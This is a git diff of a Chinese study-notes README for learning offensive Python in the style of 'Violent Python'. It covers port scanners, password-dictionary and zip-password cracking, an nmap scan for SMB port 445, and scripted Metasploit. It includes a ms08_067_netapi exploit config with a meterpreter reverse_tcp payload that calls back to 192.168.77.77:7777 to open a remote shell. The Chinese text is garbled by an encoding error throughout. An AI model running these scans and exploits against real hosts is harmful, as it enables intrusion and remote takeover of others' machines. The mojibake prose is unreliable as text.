@@ -1,25 +1,26 @@
 # learn-python
-###20160510 python »ÒÃ±±à³Ì 3   
-  ip¡¢portÉ¨ÃèÆ÷£»Éú³Éip¶Î¡£
-###20160510 python »ÒÃ±±à³Ì 4   
-  ½âÎöÓòÃû£¬Éú³ÉÓÃ»§Ãû-¿ÚÁî ×Öµä£¬°üÀ¨¸ù¾İÓòÃûÉú³ÉµÄÓÃ»§Ãû¿ÚÁî¡£
-###20160705 python¾ø¼¼ 
-retBanner.py
-  socketÉ¨Ãèip£¬port£¬Í¨¹ı·µ»ØµÄbanner²éÑ¯vulnerable.txt
-zippass.py
+###20160510 python ç°å¸½ç¼–ç¨‹ 3   
+  ipã€portæ‰«æå™¨ï¼›ç”Ÿæˆipæ®µã€‚
+###20160510 python ç°å¸½ç¼–ç¨‹ 4   
+  è§£æåŸŸåï¼Œç”Ÿæˆç”¨æˆ·å-å£ä»¤ å­—å…¸ï¼ŒåŒ…æ‹¬æ ¹æ®åŸŸåç”Ÿæˆçš„ç”¨æˆ·åå£ä»¤ã€‚
+###20160705 pythonç»æŠ€ 
+####retBanner.py
+  socketæ‰«æipï¼Œportï¼Œé€šè¿‡è¿”å›çš„banneræŸ¥è¯¢vulnerable.txt
+####zippass.py
   zFile = zipfile.ZipFile('evil.zip', 'r')
   zFile.extractall(pwd='password')
-  Ê¹ÓÃ¶àÏß³Ì£º
+  ä½¿ç”¨å¤šçº¿ç¨‹ï¼š
   t = Thread(target = functionname, args = (args))
   t.start
-4scanner.py
-  argparse½âÎöÃüÁîĞĞ²ÎÊı
-  # ²ÎÊıÓÃ-h»áÓëÄ¬ÈÏµÄ°ïÖúµÄ-h³åÍ»
-    # ÃüÁîĞĞÏÂÔËĞĞÊ±ĞèÒªÊ¹ÓÃpython name.py
-    # --portlist --ºóµÄÊÇ±äÁ¿Ãû
-    # nargs = '*' ¿ÉÊÇ¶à¸ö±äÁ¿£¨¶Ë¿Ú£©
+####4scanner.py
+  argparseè§£æå‘½ä»¤è¡Œå‚æ•°
+  # å‚æ•°ç”¨-hä¼šä¸é»˜è®¤çš„å¸®åŠ©çš„-hå†²çª
+    # å‘½ä»¤è¡Œä¸‹è¿è¡Œæ—¶éœ€è¦ä½¿ç”¨python name.py
+    # --portlist --åçš„æ˜¯å˜é‡å
+    # nargs = '*' å¯æ˜¯å¤šä¸ªå˜é‡ï¼ˆç«¯å£ï¼‰
 
-  ```def findTgts(subNet):
+```python
+  def findTgts(subNet):
     nmScan = nmap.PortScanner()
     nmScan.scan(subNet, '445')
     tgtHosts = []
@@ -29,10 +30,12 @@ zippass.py
             if state == 'open':
                 print '[+] Found Target Host: ' + host
                 tgtHosts.append(host)
-    return tgtHosts```
-2-5-conficker.py
-  Ê¹ÓÃpython nmap·¢ÏÖÖ÷»ú£¨É¨Ãè£©
-  ```def findTgts(subNet):
+    return tgtHosts
+```
+####2-5-conficker.py
+  ä½¿ç”¨python nmapå‘ç°ä¸»æœºï¼ˆæ‰«æï¼‰
+```python
+  def findTgts(subNet):
     nmScan = nmap.PortScanner()
     nmScan.scan(subNet, '445')
     tgtHosts = []
@@ -42,24 +45,32 @@ zippass.py
             if state == 'open':
                 print '[+] Found Target Host: ' + host
                 tgtHosts.append(host)
-    return tgtHosts```
-  Ê¹ÓÃpythonÎªmetasploitÅäÖÃ.rcÎÄ¼ş£¬²Ù×÷metasploit£º
-  ```configFile.write('use exploit/windows/smb/psexec\n')
+    return tgtHosts
+```
+  ä½¿ç”¨pythonä¸ºmetasploité…ç½®.rcæ–‡ä»¶ï¼Œæ“ä½œmetasploitï¼š
+```python
+configFile.write('use exploit/windows/smb/psexec\n')
   ...
-  configFile = open('meta.rc', 'w')```
-2-6-freeFloat.py
-  Ğ´PoC
+  configFile = open('meta.rc', 'w')
+```
+####2-6-freeFloat.py
+  å†™PoC
+```shell
   use exploit/windows/smb/ms08_067_netapi
   set RHOST 192.168.1.37
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.77.77
   set LPORT 7777
-  exploit ¨Cj ¨Cz
-  ÎªÁËÀûÓÃMetasploitµÄ¹¥»÷£¬ÎÒÃÇÑ¡ÔñÎÒÃÇµÄExploit(exploit/windows/smb/ms08_067_netapi)£¬È»ºóÉèÖÃÄ¿±êÎª192.168.1.37¡£½ÓÏÂÀ´ÎÒÃÇÖ¸¶¨¹¥»÷ºÉÔØÎªwindows/meterpreter/reverse_tcpÑ¡Ôñ·´ÏòÁ¬½Óµ½ÎÒÃÇµÄ192.168.77.77µÄ7777¶Ë¿ÚÉÏ£¬×îºóÎÒÃÇ¸æËßMetasploit¿ªÊ¼¹¥»÷ÏµÍ³¡£±£´æÅäÖÃÎÄ¼şÎªconficker.rc£¬ÎÒÃÇ¿ÉÒÔÍ¨¹ıÃüÁîmsfconsole -r conficker.rcÀ´Æô¶¯ÎÒÃÇµÄ¹¥»÷¡£Õâ¸öÃüÁî»á¸æËßMetasploit¸ù¾İconficker.rcÀ´Æô¶¯¹¥»÷¡£Èç¹û³É¹¦£¬ÎÒÃÇµÄ¹¥»÷»á·µ»ØÒ»¸öÃüÁîĞĞShellÀ´¿ØÖÆ¶Ô·½µçÄÔ¡£ 
+  exploit â€“j â€“z
+```
+  ä¸ºäº†åˆ©ç”¨Metasploitçš„æ”»å‡»ï¼Œæˆ‘ä»¬é€‰æ‹©æˆ‘ä»¬çš„Exploit(exploit/windows/smb/ms08_067_netapi)ï¼Œç„¶åè®¾ç½®ç›®æ ‡ä¸º192.168.1.37ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬æŒ‡å®šæ”»å‡»è·è½½ä¸ºwindows/meterpreter/reverse_tcpé€‰æ‹©åå‘è¿æ¥åˆ°æˆ‘ä»¬çš„192.168.77.77çš„7777ç«¯å£ä¸Šï¼Œæœ€åæˆ‘ä»¬å‘Šè¯‰Metasploitå¼€å§‹æ”»å‡»ç³»ç»Ÿã€‚ä¿å­˜é…ç½®æ–‡ä»¶ä¸ºconficker.rcï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤
+  msfconsole -r conficker.rc
+  æ¥å¯åŠ¨æˆ‘ä»¬çš„æ”»å‡»ã€‚è¿™ä¸ªå‘½ä»¤ä¼šå‘Šè¯‰Metasploitæ ¹æ®conficker.rcæ¥å¯åŠ¨æ”»å‡»ã€‚å¦‚æœæˆåŠŸï¼Œæˆ‘ä»¬çš„æ”»å‡»ä¼šè¿”å›ä¸€ä¸ªå‘½ä»¤è¡ŒShellæ¥æ§åˆ¶å¯¹æ–¹ç”µè„‘ã€‚ 
 
-32recycle.py
-ÓÃPython ½«ÓÃ»§µÄSID ¹ØÁªÆğÀ´:Í¨¹ı¼ì²é Windows ×¢²á±í¼üÖµHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>\ProfileImagePath£¬ÎÒÃÇ¿ÉÒÔ¿´µ½Ëü·µ»Ø Ò»¸öÊÇ%SystemDrive%\Documents and Settings\<USERID>¡£ÔÚÏÂÍ¼ÖĞ£¬ÎÒ ÃÇ¿´µ½ÕâÔÊĞíÎÒÃÇ½«SID ÎªS-1-5-21-1275210071-1715567821-725345543- 1005 ×ª»¯ÎªÓÃ»§Ãû¡°alex¡±¡£
-'''key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\" + sid)
+####32recycle.py
+ç”¨Python å°†ç”¨æˆ·çš„SID å…³è”èµ·æ¥:é€šè¿‡æ£€æŸ¥ Windows æ³¨å†Œè¡¨é”®å€¼HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\<SID>\ProfileImagePathï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒè¿”å› ä¸€ä¸ªæ˜¯%SystemDrive%\Documents and Settings\<USERID>ã€‚åœ¨ä¸‹å›¾ä¸­ï¼Œæˆ‘ ä»¬çœ‹åˆ°è¿™å…è®¸æˆ‘ä»¬å°†SID ä¸ºS-1-5-21-1275210071-1715567821-725345543- 1005 è½¬åŒ–ä¸ºç”¨æˆ·åâ€œalexâ€ã€‚
+```python
+key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\\" + sid)
             (value, type) = _winreg.QueryValueEx(key, "ProfileImagePath")
             user = value.split('\\')[-1]
-'''
+```
